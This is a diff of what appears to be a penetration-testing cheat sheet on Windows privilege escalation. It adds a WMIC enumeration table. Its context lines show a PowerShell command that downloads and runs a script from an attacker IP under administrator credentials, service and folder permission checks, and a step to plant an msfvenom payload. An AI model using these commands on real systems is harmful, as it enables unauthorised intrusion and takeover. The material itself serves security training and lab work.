@@ -104,7 +104,7 @@ $cred = New-Object System.Management.Automation.PSCredential('administrator',$Se
 Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/HackedAgain.ps1')" -Credential $cred
 ```
 
-## "AlwaysInstallElevated" privesc
+## AlwaysInstallElevated
 
 Always Install Elevated to create privesc user after installation.
 
@@ -134,6 +134,59 @@ Look for Folder permissions for \(W\) permissions. Overwrite with binary payload
 ```c
 icacls "C:\Program Files (x86)\Program Folder" 
 ```
+
+## WMIC
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align:left">Syntax</th>
+      <th style="text-align:left">Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align:left"><code>wmic qfe getCaption,Description,HotFixID,InstalledOn</code>
+      </td>
+      <td style="text-align:left">
+        <p>Any missing patches
+          <br />
+        </p>
+        <p>Check for exploits in exploit-db eg.:
+          <br />
+        </p>
+        <p>searchsploit MS16 windows local</p>
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align:left"><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB979682&quot;  </code>
+      </td>
+      <td style="text-align:left">Windows Vista/2008 6.1.6000 x32,Windows Vista/2008 6.1.6001 x32,Windows
+        7 6.2.7600 x32,Windows 7/2008 R2 6.2.7600 x64. (no good exploit - unlikely
+        Microsoft Windows Vista/7 - Elevation of Privileges (UAC Bypass))</td>
+    </tr>
+    <tr>
+      <td style="text-align:left"><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB2393802&quot;</code>
+      </td>
+      <td style="text-align:left">Stored Credentials</td>
+    </tr>
+    <tr>
+      <td style="text-align:left"><code>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%</code>
+      </td>
+      <td style="text-align:left">32 or 64bit?</td>
+    </tr>
+    <tr>
+      <td style="text-align:left"><code>wmic useraccount get name, sid</code>
+      </td>
+      <td style="text-align:left">Get list of user account names and SID</td>
+    </tr>
+    <tr>
+      <td style="text-align:left"><code>wmic logicaldisk get caption || fsutil fsinfo drives</code>
+      </td>
+      <td style="text-align:left">List drives</td>
+    </tr>
+  </tbody>
+</table>
 
 ## Unquoted Service Paths
 
@@ -175,7 +228,7 @@ accesschk.exe -qdws Users C:\Windows\ /accepteula
 accesschk.exe -wuvc daclsvc /accepteula
 ```
 
-![](../.gitbook/assets/image%20%2819%29.png)
+![](../.gitbook/assets/image%20%2820%29.png)
 
 ### Querying Service 
 
@@ -224,7 +277,7 @@ powershell "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl"
 
 ```
 
-![](../.gitbook/assets/image%20%2829%29.png)
+![](../.gitbook/assets/image%20%2830%29.png)
 
 Create exploit eg. Msfvenom exploit.exe and place in writable folder like 'temp'
 
